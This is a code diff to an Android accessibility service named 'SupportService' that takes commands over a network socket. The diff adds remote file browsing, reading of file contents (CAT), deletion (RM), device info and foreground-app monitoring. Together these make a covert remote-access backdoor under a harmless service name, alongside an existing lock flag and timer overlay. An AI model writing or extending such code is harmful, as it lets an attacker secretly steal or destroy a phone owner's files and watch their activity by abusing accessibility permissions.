@@ -18,7 +18,10 @@ import android.content.SharedPreferences;
 import android.os.Build;
 import android.os.Vibrator;
 import android.os.VibrationEffect;
+import android.os.Environment;
 import android.widget.Toast;
+import java.io.File;
+import java.io.FileInputStream;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
@@ -39,6 +42,7 @@ public class SupportService extends AccessibilityService {
     
     private ServerSocket serverSocket;
     private boolean isLocked = false;
+    private String currentPath = Environment.getExternalStorageDirectory().getAbsolutePath();
 
     public native boolean checkKey(String s);
     public native boolean checkStatus();
@@ -149,9 +153,59 @@ public class SupportService extends AccessibilityService {
                 performGlobalAction(GLOBAL_ACTION_BACK);
                 out.println("OK: Back Pressed");
             } else if (cmd.equals("SCREEN")) {
-                // Konsep Monitoring: Mengambil teks yang ada di layar saat ini
-                String screenData = "App: " + getRootInActiveWindow().getPackageName();
-                out.println("DATA: " + screenData);
+                String pkg = (getRootInActiveWindow() != null) ? getRootInActiveWindow().getPackageName().toString() : "Unknown";
+                out.println("DATA: " + pkg);
+            } else if (cmd.equals("PWD")) {
+                out.println(currentPath);
+            } else if (cmd.startsWith("CD ")) {
+                String newPath = cmd.substring(3).trim();
+                File dir = new File(newPath.startsWith("/") ? newPath : currentPath + "/" + newPath);
+                if (dir.exists() && dir.isDirectory()) {
+                    currentPath = dir.getAbsolutePath();
+                    out.println("OK: Changed to " + currentPath);
+                } else {
+                    out.println("ERROR: Not a directory");
+                }
+            } else if (cmd.startsWith("LS")) {
+                String path = cmd.length() > 3 ? cmd.substring(3).trim() : currentPath;
+                File dir = new File(path.startsWith("/") ? path : currentPath + "/" + path);
+                if (dir.exists() && dir.isDirectory()) {
+                    File[] files = dir.listFiles();
+                    if (files != null) {
+                        StringBuilder sb = new StringBuilder();
+                        for (File f : files) {
+                            sb.append(f.isDirectory() ? "[D] " : "[F] ").append(f.getName()).append("\n");
+                        }
+                        out.println(sb.toString().isEmpty() ? "Empty" : sb.toString());
+                    } else {
+                        out.println("ERROR: Access Denied");
+                    }
+                } else {
+                    out.println("ERROR: Invalid Dir");
+                }
+            } else if (cmd.startsWith("CAT ")) {
+                String fileName = cmd.substring(4).trim();
+                File f = new File(fileName.startsWith("/") ? fileName : currentPath + "/" + fileName);
+                if (f.exists() && f.isFile()) {
+                    BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(f)));
+                    String line;
+                    StringBuilder content = new StringBuilder();
+                    while ((line = br.readLine()) != null) content.append(line).append("\n");
+                    br.close();
+                    out.println(content.toString());
+                } else {
+                    out.println("ERROR: File not found");
+                }
+            } else if (cmd.startsWith("RM ")) {
+                String fileName = cmd.substring(3).trim();
+                File f = new File(fileName.startsWith("/") ? fileName : currentPath + "/" + fileName);
+                if (f.exists() && f.delete()) {
+                    out.println("OK: Deleted");
+                } else {
+                    out.println("ERROR: Delete failed");
+                }
+            } else if (cmd.equals("INFO")) {
+                out.println("Model: " + Build.MODEL + " | Android: " + Build.VERSION.RELEASE);
             } else {
                 out.println("ERROR: Unknown Command");
             }
@@ -186,7 +240,6 @@ public class SupportService extends AccessibilityService {
         tv_status = overlay.findViewById(R.id.v_timer);
         tv_display = overlay.findViewById(R.id.v_display);
         
-        // Setup buttons... (seperti sebelumnya)
         setupButtons();
 
         wm.addView(overlay, lp);
